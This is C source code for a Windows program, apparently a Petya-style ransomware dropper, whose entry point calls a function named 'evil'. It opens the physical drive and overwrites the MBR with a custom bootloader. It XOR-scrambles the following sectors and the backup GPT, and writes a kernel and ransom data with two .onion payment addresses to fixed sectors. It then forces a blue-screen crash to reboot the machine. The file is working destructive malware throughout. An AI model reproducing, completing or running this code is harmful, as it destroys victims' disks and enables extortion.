#include <Windows.h>
#include <stdint.h>
#include "base58.h"
#include "data.h"

uint64_t uint8to64(uint8_t fouruint8[8]) {
	return *(uint64_t*)fouruint8;
	//return((uint64_t)fouruint8[7] << 56) | ((uint64_t)fouruint8[6] << 48) | ((uint64_t)fouruint8[5] << 40) | ((uint64_t)fouruint8[4] << 32) |
		//((uint64_t)fouruint8[3] << 24) | ((uint64_t)fouruint8[2] << 16) | ((uint64_t)fouruint8[1] << 8) | ((uint64_t)fouruint8[0]);;
}

typedef NTSTATUS (WINAPI *PNTRAISE)(NTSTATUS,ULONG,ULONG,PULONG,UINT,PULONG);
signed int hard_reboot()
{
	HANDLE hProc;
	HMODULE hMod;
	PNTRAISE NtRaiseHardError;
	struct _TOKEN_PRIVILEGES NewState;
	DWORD dwRet;
	HANDLE TokenHandle;

	hProc = GetCurrentProcess();
	if (!OpenProcessToken(hProc, 0x28, &TokenHandle))
	 return 0;
 
	LookupPrivilegeValueA(0, "SeShutdownPrivilege", (PLUID)NewState.Privileges);
	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Attributes = 2;

	AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
	if (GetLastError())
	 return 0;
 
	hMod = GetModuleHandleA("NTDLL.DLL");
	NtRaiseHardError = (PNTRAISE)GetProcAddress(hMod, "NtRaiseHardError");
	NtRaiseHardError(0xC0000350, 0, 0, 0, 6, &dwRet);
	return 0;
}

void evil()
{
	GetTickCount();
	DWORD wb;
	VOLUME_DISK_EXTENTS diskExtents;
	char buffer[6];
	char system[MAX_PATH];
    	GetSystemDirectoryA(system, sizeof(system));
	char path[] = "\\\\.\\";
	char NUL[]="\0";

	memcpy(buffer + 0, path + 0, 4);
	memcpy(buffer + 4, system + 0, 2);
    	memcpy(buffer + 6, NUL + 0, 1);

	HANDLE LogicalDrive = CreateFileA(buffer, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (LogicalDrive == INVALID_HANDLE_VALUE){
		ExitProcess(0);
	}
 
    	DeviceIoControl(LogicalDrive, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, 0,0, &diskExtents, sizeof(diskExtents), &wb, NULL);

	CloseHandle(LogicalDrive);

	int Sector = (int)diskExtents.Extents[0].StartingOffset.QuadPart / 512;

	if(Sector <= 0x3C) { ExitProcess(0); } else {
	
	char physicaldevice[] = "\\\\.\\PhysicalDrive";
 
    	char buf[19];

	char number[2];
	memset(number, 0x00, 2);
	wsprintfA(number, "%d", diskExtents.Extents[0].DiskNumber);
	memcpy(buf + 0, physicaldevice, 17);
	memcpy(buf + 17, number, 2);

	HANDLE PhysicalDrive = CreateFileA(buf, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, 0);

	if (PhysicalDrive == INVALID_HANDLE_VALUE){
		ExitProcess(0);
	}

	DISK_GEOMETRY OutBuffer;
	DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY, 0, 0, &OutBuffer, sizeof(OutBuffer), &wb, 0);

	char XORMBR[512];
	int sector57 = 57*512;
	int sector56 = 56*512;
	int sector55 = 55*512;
	int sector54 = 54*512;
	int sector34 = 34*512;
	char xor33sectors[16896];
	char sector54content[512];
	char sector55content[512];
	char sector57content[512];
	char NewMbr[512];
	char OldMbr[512];
	memset(sector57content, 0x00, 512);
	memset(sector55content, 0x37, 512);
	char onion1[] = "http://petya37h5tbhyvki.onion/";
	char onion2[] = "http://petya5koahtsf7sv.onion/";
	char foronion[] = {0x0D, 0x0A, 0x20, 0x20, 0x20, 0x20};
	BYTE nonce[8];
	BYTE Id[90];
	BYTE random[6];
	HCRYPTPROV prov;
	CryptAcquireContextA(&prov, 0, 0, 1u, 0xF0000000);
	CryptGenRandom(prov, 8, nonce);
	CryptGenRandom(prov, 90, Id);
	CryptGenRandom(prov, 6, random);
	CryptReleaseContext(prov, 0);
	BYTE EncodedId[90];
	BYTE actualonion1[36];
	BYTE actualonion2[36];
	BYTE actualrandom[6];
	EncodeBase58(random, 6, actualrandom);
	memcpy(actualonion1 + 0, onion1 + 0, 30);
	memcpy(actualonion2 + 0, onion2 + 0, 30);
	memcpy(actualonion1 + 30, actualrandom + 0, 6);
	memcpy(actualonion2 + 30, actualrandom + 0, 6);

	BYTE flag[] = {0x01};
	memset(sector54content, 0x00, 512);
	memcpy(sector54content + 0, flag + 0, 1);
   	memcpy(sector54content + 33, nonce + 0, 8);
    	memcpy(sector54content + 41, actualonion1 + 0, 36);
    	memcpy(sector54content + 77, foronion + 0, 6);
    	memcpy(sector54content + 83, actualonion2 + 0, 36);
	EncodeBase58(Id, 90, EncodedId);
	memcpy(sector54content + 169, EncodedId + 0, 90);
	
	PARTITION_INFORMATION_EX info;
	DeviceIoControl(PhysicalDrive, IOCTL_DISK_GET_PARTITION_INFO_EX, 0,0, &info, sizeof(info), &wb, NULL);
	if(info.PartitionStyle == PARTITION_STYLE_MBR)
	{
		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		ReadFile(PhysicalDrive, XORMBR, 512, &wb, NULL);
		for (int i = 0; i < 512; i++)XORMBR[i] ^= 0x37;
		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		ReadFile(PhysicalDrive, OldMbr, 512, &wb, NULL);
		memcpy(NewMbr,bootloader,512);
		memcpy(NewMbr + 440, OldMbr + 440, 70);
		//
		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, NewMbr, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
		ReadFile(PhysicalDrive, xor33sectors, 16896, &wb, NULL);
		for (int i = 0; i < 16896; i++)xor33sectors[i] ^= 0x37;
		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, xor33sectors, 16896, &wb, NULL);
		SetFilePointer(PhysicalDrive, sector34,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, kernel, sizeof(kernel), &wb, NULL);
		SetFilePointer(PhysicalDrive, sector54,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, sector54content, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, sector55,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, sector55content, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, sector56,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, XORMBR, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, sector57,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, sector57content, 512, &wb, NULL);
		CloseHandle(PhysicalDrive);
		//
		hard_reboot();
	}
	else if(info.PartitionStyle == PARTITION_STYLE_GPT)
	{
		char gpt[16896];
		char firstLBA[512]; //FIRST LBA
		uint8_t backup_lba[8]; //LAST LBA

		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);

		ReadFile(PhysicalDrive, firstLBA, 512, &wb, NULL);

		memcpy(backup_lba + 0, firstLBA + 32, 8);

		LARGE_INTEGER number;
		number.QuadPart = (ULONGLONG)uint8to64(backup_lba)*(ULONGLONG)512 -32 * 512;

		SetFilePointerEx(PhysicalDrive, number,0, FILE_BEGIN);

		ReadFile(PhysicalDrive, gpt, 16896, &wb, NULL);
	
		for (int i = 0; i < 16896; i++)gpt[i] ^= 0x37; //XOR with 0x37

		SetFilePointerEx(PhysicalDrive, number,0, FILE_BEGIN);

		WriteFile(PhysicalDrive, gpt, 16896, &wb, NULL);

		char special[] = {0x37, 0x37, 0x37, 0x37};
		BYTE bootflag[] = {0x80};
		BYTE StartHead[] = {0x02};
		BYTE StartSector[] = {0x03};
		BYTE StartCylinder[] = {0x00};
		BYTE SystemId[] = {0x07};
		BYTE EndSector[] = {0x03};
		DWORD RelativeSector = 128;
		DWORD TotalSectors = (DWORD)uint8to64(backup_lba) -128;
		DWORD EndCylinder = TotalSectors / (OutBuffer.TracksPerCylinder * OutBuffer.SectorsPerTrack);
		DWORD remainder = TotalSectors - (EndCylinder * OutBuffer.TracksPerCylinder * OutBuffer.SectorsPerTrack);
		DWORD EndHead = remainder / OutBuffer.SectorsPerTrack;
		memcpy(NewMbr,bootloader,512);
		memcpy(NewMbr + 440, special, 4);
		memcpy(NewMbr + 446, bootflag, 1);
		memcpy(NewMbr + 447, StartHead, 1);
		memcpy(NewMbr + 448, StartSector, 1);
		memcpy(NewMbr + 449, StartCylinder, 1);
		memcpy(NewMbr + 450, SystemId, 1);
		memcpy(NewMbr + 451, &EndHead, 1);
		memcpy(NewMbr + 452, EndSector, 1);
		memcpy(NewMbr + 453, &EndCylinder, 1);
		memcpy(NewMbr + 454, &RelativeSector, 4);
		memcpy(NewMbr + 458, &TotalSectors, 4);
		//
		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		ReadFile(PhysicalDrive, XORMBR, 512, &wb, NULL);
		for (int i = 0; i < 512; i++)XORMBR[i] ^= 0x37;
		SetFilePointer(PhysicalDrive, 0,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, NewMbr, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
		ReadFile(PhysicalDrive, xor33sectors, 16896, &wb, NULL);
		for (int i = 0; i < 16896; i++)xor33sectors[i] ^= 0x37;
		SetFilePointer(PhysicalDrive, 512,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, xor33sectors, 16896, &wb, NULL);
		SetFilePointer(PhysicalDrive, sector34,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, kernel, sizeof(kernel), &wb, NULL);
		SetFilePointer(PhysicalDrive, sector54,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, sector54content, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, sector55,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, sector55content, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, sector56,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, XORMBR, 512, &wb, NULL);
		SetFilePointer(PhysicalDrive, sector57,0, FILE_BEGIN);
		WriteFile(PhysicalDrive, sector57content, 512, &wb, NULL);
		//
		CloseHandle(PhysicalDrive);
		hard_reboot();
	}
	}
}
int _stdcall WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmd, int nCmdShow)
{
	evil();
	return 0;
}